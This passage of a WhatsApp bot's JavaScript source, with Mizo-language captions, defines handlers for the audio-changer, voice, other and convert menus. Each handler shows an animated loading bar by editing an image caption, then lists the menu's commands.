͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Sticker Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}sticker 
┃𒆜│${prefix}ttp
┃𒆜│${prefix}ttp2
┃𒆜│${prefix}ttp3
┃𒆜│${prefix}ttp4
┃𒆜│${prefix}attp
┃𒆜│${prefix}attp2
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'audiochanger': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Audio Changer*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Audio Changer❏*
┃𒆜┌───┈
┃𒆜│${prefix}robot
┃𒆜│${prefix}bass
┃𒆜│${prefix}nightcore
┃𒆜│${prefix}deep
┃𒆜│${prefix}fast
┃𒆜│${prefix}slow
┃𒆜│${prefix}reverse
┃𒆜│${prefix}blown
┃𒆜│${prefix}smooth
┃𒆜│${prefix}squirrel
┃𒆜│${prefix}errape
┃𒆜│${prefix}fat
┃𒆜│${prefix}tokaraoke
┃𒆜│${prefix}voiceremove
┃𒆜│${prefix}tovocal
┃𒆜│${prefix}noiseremove
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'voicemenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Voice Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Voice Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}tovn
┃𒆜│${prefix}tts
┃𒆜│${prefix}tts2
┃𒆜│${prefix}tts3
┃𒆜│${prefix}tts4
┃𒆜│${prefix}tts5
┃𒆜│${prefix}tts6
┃𒆜│${prefix}tts7
┃𒆜│${prefix}tts8
┃𒆜│${prefix}tts9
┃𒆜│${prefix}tts10
┃𒆜│${prefix}alto
┃𒆜│${prefix}tenor
┃𒆜│${prefix}sunshine
┃𒆜│${prefix}warmy
┃𒆜│${prefix}glorious
┃𒆜│${prefix}itgoesup
┃𒆜│${prefix}chipmunk
┃𒆜│${prefix}dramatic
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'othermenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Other Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Other Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}leaderboard
┃𒆜│${prefix}lb
┃𒆜│${prefix}richest 
┃𒆜│${prefix}list tobebot
┃𒆜│${prefix}how tobebot
┃𒆜│${prefix}mawl ber
┃𒆜│${prefix}sual ber
┃𒆜│${prefix}fing ber
┃𒆜│${prefix}a ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}hmelchhe ber
┃𒆜│${prefix}damrei ber
┃𒆜│${prefix}dawih ber
┃𒆜│${prefix}hrisel ber
┃𒆜│${prefix}upa ber
┃𒆜│${prefix}naupang ber
┃𒆜│${prefix}hmeltha ber
┃𒆜│${prefix}lulian ber
┃𒆜│${prefix}zaktheilo ber
┃𒆜│${prefix}zakzum ber
┃𒆜│${prefix}nawi ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}mifel ber
┃𒆜│${prefix}chawheh ber
┃𒆜│${prefix}bumhmang ber
┃𒆜│${prefix}lerh ber
┃𒆜│${prefix}luck ber
┃𒆜│${prefix}zei ber
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break

case 'convertmenu': {
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Convert Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕ VIP :* ${aActiveEm}
╰══════════════
